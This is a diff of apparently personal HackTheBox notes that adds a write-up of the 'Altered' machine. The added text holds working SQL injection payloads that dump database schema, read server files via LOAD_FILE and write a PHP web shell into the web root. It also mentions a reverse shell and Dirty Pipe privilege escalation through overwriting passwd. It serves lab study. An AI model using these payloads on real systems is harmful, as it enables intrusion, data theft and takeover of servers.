@@ -1,5 +1,5 @@
 ---
-title: htb stacked
+title: htb altered
 author: Yuchao
 date: 2022-04-02 11:33:00 +0800
 categories: [sec]
@@ -43,4 +43,43 @@ wfuzz -e iterators
 #   zip     | Returns an iterator that aggregates elements from each of the iterables.  
 ```
 
+## type juggling and SQL injection
 
+read database
+```
+{
+  "id":"100 union select 1,2,group_concat(concat('\n', table_name, ':', column_name)) from information_schema.columns where table_schema='uhc' -- -",
+  "sceret":true
+}
+```
+
+read file
+```
+{
+  "id":"100 union select 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default')-- -",
+  "sceret":true
+}
+```
+find out website`s root file, at /srv/altered/public
+
+write web shell to website
+```
+{
+  "id":"100 union select 1,2,'<?php system($_REQUEST[\"cmd\"]);  ?>' into outfile '/srv/altered/public/shell.php'-- -",
+  "sceret":true
+}
+```
+got an error, but file still wrote to server.
+
+Then make a reverse shell by it. Make sure not hang the server after the reverse shell.
+
+## privesc
+
+``` uname -a ```
+
+find the kernel was build on 2022/01/10
+
+Dirty Pipe.
+- come out later than the kernel.
+- <https://dirtypipe.cm4all.com/>
+- overwrite data to file, like passwd.
